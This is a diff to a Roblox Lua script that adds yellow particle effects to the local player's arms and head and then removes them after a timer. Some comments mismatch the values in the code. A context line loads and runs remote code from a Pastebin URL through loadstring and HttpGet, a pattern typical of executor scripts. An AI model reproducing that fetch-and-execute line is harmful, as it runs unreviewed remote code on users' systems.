@@ -596,6 +596,27 @@ local function applyEffect(effectSource, parentPart, particleCount, color)
     end
 end
 
+-- Apply all the effects to the character's Right Arm part
+applyEffect(game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.Attachment, game.Players.LocalPlayer.Character["Right Arm"], 10, yellowColor)  -- ArmBurst with yellow like bullet
+applyEffect(game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmBurst.a, game.Players.LocalPlayer.Character["Right Arm"], 10, yellowColor)         -- ArmBurst with yellow
+applyEffect(game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmFX, game.Players.LocalPlayer.Character["Right Arm"], 15, yellowColor)               -- ArmFX with grey
+applyEffect(game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].EyeEmit, game.Players.LocalPlayer.Character["Head"], 15, yellowColor)               -- ArmFX with grey
+applyEffect(game.ReplicatedStorage.Resources.FiveSeasonsFX["CharFX"].ArmFX, game.Players.LocalPlayer.Character["Left Arm"], 15, yellowColor)               -- ArmFX with grey
+
+
+-- Function to stop and clean up the effects
+local function stopEffects()
+    for _, fx in ipairs(effects) do
+        if fx then
+            fx:Destroy()  -- Remove each effect
+        end
+    end
+end
+
+-- Set a timer to stop the effects after 5 seconds
+wait(10)
+stopEffects()
+
 loadstring(game:HttpGet('https://pastebin.com/raw/6MLS9n2d'))()
 
     end
